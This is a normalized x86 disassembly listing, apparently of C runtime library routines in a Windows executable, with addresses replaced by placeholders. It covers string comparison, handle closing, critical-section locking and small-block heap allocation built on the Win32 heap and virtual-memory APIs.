mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp dx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or edx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] dx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov ecx 0xffff
cmp [ ebp - 0x22 ] cx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc edx
jmp r-xdata
sub_42dd98
push 0xc
push r--data
call sub_42b398
push 0xe
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42ddff
call sub_42b3dd
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_424869
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_424869
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_42de10
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_42de98
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_43674e
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_425ed7
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_43674e
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_43674e
push 0x1
mov edi eax
call sub_43674e
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_4366c8
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_42df34
push 0x10
push r--data
call sub_42b398
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_425ec4
and [ eax ] 0x0
call sub_425eb1
mov [ eax ] 0x9
call sub_425ec4
mov [ eax ] edi
call sub_425eb1
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_42b3dd
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_4367c5
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_425eb1
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_42de98
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42dff7
mov eax [ ebp - 0x1c ]
sub_42e001
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_424869
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_42e041
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_42a4ac
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_42e069
push 0x10
push r--data
call sub_42b398
xor eax eax
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
setne al
cmp eax edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_425eb1
mov [ eax ] 0x16
push edi
push edi
push edi
push edi
push edi
call sub_423d36
add esp 0x14
or eax 0xffffffff
jmp r-xdata
push ebx
push edi
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x4
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_42e2eb
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
call sub_42b3dd
retn
mov esi [ ebp - 0x1c ]
mov esi [ ebx - 0x4 ]
sub esi 0x9
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42e103
cmp [ ebp - 0x20 ] edi
jne r-xdata
sub_42e10c
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
push 0x0
sete al
push 0x1000
push eax
call [ HeapCreate@IAT ]
mov [ rw-data ] eax
test eax eax
jne r-xdata
xor eax eax
inc eax
mov [ rw-data ] eax
pop ebp
retn
pop ebp
retn
sub_42e13c
mov edi edi
push esi
push edi
xor esi esi
mov edi rw-data
inc esi
cmp esi 0x24
jl r-xdata
lea eax [ esi * 8 + rw-data ]
mov [ eax ] edi
push 0xfa0
push [ eax ]
add edi 0x18
call sub_435756
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi * 8 + rw-data ] 0x1
jne r-xdata
xor eax eax
inc eax
and [ esi * 8 + rw-data ] 0x0
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_42e187
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_424869
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_42e1f5
push 0xc
push r--data
call sub_42b398
xor edi edi
inc edi
mov [ ebp - 0x1c ] edi
xor ebx ebx
cmp [ rw-data ] ebx
jne r-xdata
mov esi [ ebp + 0x8 ]
lea esi [ esi * 8 + rw-data ]
cmp [ esi ] ebx
je r-xdata
call sub_42c6ea
push 0x1e
call sub_42c53f
push 0xff
call sub_42af81
push 0x18
call sub_428905
pop ecx
mov edi eax
cmp edi ebx
jne r-xdata
mov eax edi
jmp r-xdata
push 0xa
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi ] ebx
jne r-xdata
call sub_425eb1
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
call sub_42b3dd
retn
push edi
call sub_424869
pop ecx
push 0xfa0
push edi
call sub_435756
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ esi ] edi
jmp r-xdata
push edi
call sub_424869
pop ecx
call sub_425eb1
mov [ eax ] 0xc
mov [ ebp - 0x1c ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42e2af
mov eax [ ebp - 0x1c ]
sub_42e2b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_42e1f5
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_42af2d
pop ecx
sub_42e2eb
mov edi edi
push ebp
mov ebp esp
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_42e31b
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
mov ebx [ ebp - 0x8 ]
and ebx 0x1
mov [ ebp - 0xc ] ebx
jne r-xdata
push 0x3f
pop edx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
push 0x3f
pop edx
mov ebx [ ebp + 0x8 ]
sub esi [ ebp - 0x8 ]
mov ebx [ ebp - 0x8 ]
sar ebx 0x4
push 0x3f
mov [ ebp + 0xc ] esi
dec ebx
pop esi
cmp ebx esi
jbe r-xdata
mov edx [ ebx + 0x8 ]
mov ebx [ ebx + 0x4 ]
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0xc ]
mov [ edx + 0x4 ] ebx
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov ebx 0x80000000
cmp edx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edx * 8 ]
mov ebx [ ecx + 0x4 ]
mov [ esi + 0x8 ] ecx
mov [ esi + 0x4 ] ebx
mov [ ecx + 0x4 ] esi
mov ecx [ esi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov ecx [ esi + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
cmp ebx edx
je r-xdata
add ecx [ ebp - 0x8 ]
mov edx ecx
sar edx 0x4
dec edx
mov [ ebp - 0x4 ] ecx
cmp edx esi
jbe r-xdata
mov ebx esi
lea ecx [ edx - 0x20 ]
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx edx
shr ebx cl
lea ecx [ edx + eax + 0x4 ]
not ebx
and [ eax + edi * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
mov [ eax + esi - 0x4 ] eax
mov eax [ ebp - 0x10 ]
dec [ eax ]
jne r-xdata
mov cl [ edx + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ edx + eax + 0x4 ] cl
cmp edx 0x20
jae r-xdata
cmp ebx edx
je r-xdata
mov edx esi
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
pop ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov esi [ ebp + 0xc ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
cmp esi [ ecx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] edi
mov ecx [ rw-data ]
mov esi [ VirtualFree@IAT ]
push 0x4000
shl ecx 0xf
add ecx [ eax + 0xc ]
mov ebx 0x8000
push ebx
push ecx
call esi
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov edx 0x80000000
shr edx cl
or [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
mov ecx [ rw-data ]
and [ eax + ecx * 4 + 0xc4 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
dec [ eax + 0x43 ]
mov eax [ rw-data ]
mov ecx [ eax + 0x10 ]
cmp [ ecx + 0x43 ] 0x0
jne r-xdata
lea ecx [ edx - 0x20 ]
mov edx 0x80000000
shr edx cl
lea eax [ eax + edi * 4 + 0xc4 ]
or [ eax ] edx
lea ecx [ edx - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
mov ebx 0x80000000
mov ecx edx
shr ebx cl
lea eax [ eax + edi * 4 + 0x44 ]
or [ eax ] ebx
jmp r-xdata
mov ecx edx
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ esi + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov esi [ ecx + 0x4 ]
mov ecx [ ecx + 0x8 ]
mov [ esi + 0x8 ] ecx
mov esi 0x80000000
cmp ebx 0x20
jae r-xdata
cmp [ eax + 0x8 ] 0xffffffff
jne r-xdata
and [ eax + 0x4 ] 0xfffffffe
mov eax [ rw-data ]
lea ecx [ ebx - 0x20 ]
shr esi cl
not esi
and [ eax + edi * 4 + 0xc4 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
mov ecx ebx
shr esi cl
not esi
and [ eax + edi * 4 + 0x44 ] esi
dec [ ebx + eax + 0x4 ]
jne r-xdata
push ebx
push 0x0
push [ eax + 0xc ]
call esi
mov eax [ rw-data ]
push [ eax + 0x10 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
imul ecx ecx 0x14
mov edx [ rw-data ]
sub ecx eax
lea ecx [ ecx + edx - 0x14 ]
push ecx
lea ecx [ eax + 0x14 ]
push ecx
push eax
call sub_4250d0
mov eax [ ebp + 0x8 ]
add esp 0xc
dec [ rw-data ]
cmp eax [ rw-data ]
jbe r-xdata
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] esi
mov ecx [ ebp + 0x8 ]
and [ ecx ] esi
jmp r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
sub [ ebp + 0x8 ] 0x14
sub_42e631
mov eax [ rw-data ]
push esi
mov esi [ rw-data ]
push edi
xor edi edi
cmp esi eax
jne r-xdata
imul esi esi 0x14
add esi [ rw-data ]
push 0x41c4
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ esi + 0x10 ] eax
cmp eax edi
je r-xdata
add eax 0x10
imul eax eax 0x14
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
jne r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
mov [ esi + 0xc ] eax
cmp eax edi
jne r-xdata
add [ rw-data ] 0x10
mov esi [ rw-data ]
mov [ rw-data ] eax
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
jmp r-xdata
sub_42e6e1
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x8 ]
push ebx
push esi
mov esi [ ecx + 0x10 ]
push edi
xor ebx ebx
jmp r-xdata
test eax eax
jge r-xdata
add eax eax
inc ebx
mov eax ebx
imul eax eax 0x204
lea eax [ eax + esi + 0x144 ]
push 0x3f
mov [ ebp - 0x8 ] eax
pop edx
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
push 0x4
mov edi ebx
push 0x1000
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
lea edx [ edi + 0x7000 ]
mov [ ebp - 0x4 ] edx
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1f8
lea ecx [ edi + 0xc ]
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
xor edi edi
inc edi
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
mov ecx edx
sub ecx edi
shr ecx 0xc
lea eax [ edi + 0x10 ]
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea edx [ eax + 0xffc ]
mov [ eax ] edx
lea edx [ eax - 0x1004 ]
mov [ eax - 0x4 ] 0xff0
mov [ eax + 0x4 ] edx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
dec ecx
jne r-xdata
mov edx [ ebp - 0x4 ]
sub_42e7e9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0xc ]
mov edx edi
sub edx [ ecx + 0xc ]
add esi 0x17
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
and esi 0xfffffff0
dec ecx
cmp esi ecx
lea edi [ ecx + edi - 0x4 ]
mov ebx [ edi ]
mov [ ebp + 0x10 ] ecx
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
xor eax eax
inc eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
sar esi 0x4
dec esi
mov [ ebp + 0xc ] ebx
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
mov [ ebp - 0x8 ] ecx
cmp ecx 0x3f
jbe r-xdata
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] edi
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
cmp esi 0x20
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov ebx 0x80000000
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx 0x80000000
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
cmp edi 0x20
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_42eaca
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
imul eax eax 0x14
add eax [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push ebx
dec ecx
cmp ecx 0x20
push esi
push edi
jge r-xdata
add ecx 0xffffffe0
or edx 0xffffffff
xor esi esi
shr edx cl
mov [ ebp - 0x8 ] edx
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx eax
jb r-xdata
mov ecx [ rw-data ]
mov ebx ecx
jmp r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx eax
jne r-xdata
add ebx 0x14
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
cmp edx 0xffffffff
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
mov edx [ eax + 0xc4 ]
lea ecx [ eax + 0x44 ]
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
mov [ ebp + 0x8 ] ebx
cmp ebx ecx
jb r-xdata
mov edx [ ebp - 0x4 ]
inc [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
add ecx 0x4
jmp r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ ebx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
cmp ebx ecx
jne r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
mov edi [ ecx ]
and edx [ ebp - 0x8 ]
and edi esi
or edx edi
jne r-xdata
add ebx 0x14
jmp r-xdata
add ecx ecx
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp ebx eax
jb r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_42e6e1
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
je r-xdata
